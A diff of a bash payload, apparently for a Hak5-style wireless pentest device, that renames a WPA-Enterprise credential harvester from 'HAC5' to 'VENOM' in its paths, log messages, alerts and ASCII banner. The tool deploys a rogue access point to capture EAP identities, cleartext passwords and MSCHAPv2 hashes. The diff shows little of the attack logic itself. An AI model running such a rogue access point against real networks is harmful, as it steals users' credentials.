@@ -1,5 +1,5 @@
 #!/bin/bash
-# Title: HAC5 - WPA-Enterprise Credential Harvester
+# Title: VENOM - WPA-Enterprise Credential Harvester
 # Author: sinXneo
 # Description: Deploys rogue WPA-Enterprise AP to capture EAP identities and credentials
 # Version: 1.0
@@ -15,16 +15,16 @@
 # ============================================
 
 # Loot and temp directories
-LOOT_DIR="/root/loot/hac5"
-TEMP_DIR="/tmp/hac5"
+LOOT_DIR="/root/loot/venom"
+TEMP_DIR="/tmp/venom"
 CERT_DIR="$TEMP_DIR/certs"
-HOSTAPD_CONF="$TEMP_DIR/hostapd-hac5.conf"
+HOSTAPD_CONF="$TEMP_DIR/hostapd-venom.conf"
 EAP_USER_FILE="$TEMP_DIR/eap_users"
 HOSTAPD_LOG="$TEMP_DIR/hostapd.log"
 TCPDUMP_PCAP="$TEMP_DIR/eap_capture.pcap"
 
 # Rogue AP settings
-VENOM_IFACE="wlan_hac5"
+VENOM_IFACE="wlan_venom"
 PHY_DEVICE="phy1"
 DEFAULT_CHANNEL=6
 DEFAULT_HW_MODE="g"
@@ -873,7 +873,7 @@ parse_credentials() {
 
 live_monitor() {
     LOG ""
-    logboth green "=== HAC5 ACTIVE ==="
+    logboth green "=== VENOM ACTIVE ==="
     logboth green "Rogue AP: $TARGET_SSID"
     logboth green "Channel: $TARGET_CHANNEL"
     LOG ""
@@ -978,7 +978,7 @@ generate_report() {
 
     {
         echo "======================================"
-        echo "  HAC5 - Engagement Report"
+        echo "  VENOM - Engagement Report"
         echo "======================================"
         echo ""
         echo "Date:     $(date '+%Y-%m-%d %H:%M:%S')"
@@ -1080,7 +1080,7 @@ harvest_results() {
     # Display summary
     LOG ""
     LOG green "=========================================="
-    LOG green "  HAC5 HARVEST COMPLETE"
+    LOG green "  VENOM HARVEST COMPLETE"
     LOG green "=========================================="
     LOG ""
     LOG blue "Target:     $TARGET_SSID"
@@ -1107,10 +1107,10 @@ harvest_results() {
         sleep 0.3
         VIBRATE
         play_complete
-        ALERT "HAC5 COMPLETE!\n\nIdentities: $IDENTITY_COUNT\nCleartext: $CLEARTEXT_COUNT\nMSCHAPv2: $MSCHAPV2_COUNT\n\nLoot saved"
+        ALERT "VENOM COMPLETE!\n\nIdentities: $IDENTITY_COUNT\nCleartext: $CLEARTEXT_COUNT\nMSCHAPv2: $MSCHAPV2_COUNT\n\nLoot saved"
     else
         play_fail
-        ALERT "HAC5 COMPLETE\n\nNo credentials captured\n\nRaw logs saved to:\n$SESSION_DIR"
+        ALERT "VENOM COMPLETE\n\nNo credentials captured\n\nRaw logs saved to:\n$SESSION_DIR"
     fi
 }
 
@@ -1119,19 +1119,17 @@ harvest_results() {
 # ============================================
 
 LOG ""
-LOG red "  _    _          _____ _____ "
-LOG red " | |  | |   /\   / ____| ____|"
-LOG red " | |__| |  /  \ | |    | |__  "
-LOG red " |  __  | / /\ \| |    |___ \ "
-LOG red " | |  | |/ ____ \ |____ ____| |"
-LOG red " |_|  |_/_/    \_\_____|_____/ "
+LOG red " __   _____ _  _  ___  __  __ "
+LOG red " \\ \\ / / __| \\| |/ _ \\|  \\/  |"
+LOG red "  \\ V /| _|| .\` | (_) | |\\/| |"
+LOG red "   \\_/ |___|_|\\_|\\___/|_|  |_|"
 LOG ""
 LOG red "  WPA-Enterprise Credential Harvester"
 LOG red "  v1.0"
 LOG ""
 
 # Confirm start
-resp=$(CONFIRMATION_DIALOG "Start HAC5?\n\nDeploys rogue WPA-Enterprise\nAP to capture credentials\n\nAuthorized testing only!")
+resp=$(CONFIRMATION_DIALOG "Start Venom?\n\nDeploys rogue WPA-Enterprise\nAP to capture credentials\n\nAuthorized testing only!")
 case $? in
     $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
         LOG "Cancelled"
@@ -1259,5 +1257,5 @@ LOG blue "=== PHASE 4: HARVEST ==="
 harvest_results
 
 LOG ""
-LOG green "HAC5 complete"
+LOG green "VENOM complete"
 exit 0
